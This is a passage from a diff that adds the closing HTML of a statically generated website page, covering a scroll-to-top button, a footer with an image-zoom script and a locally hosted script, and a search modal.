+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+
+    
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
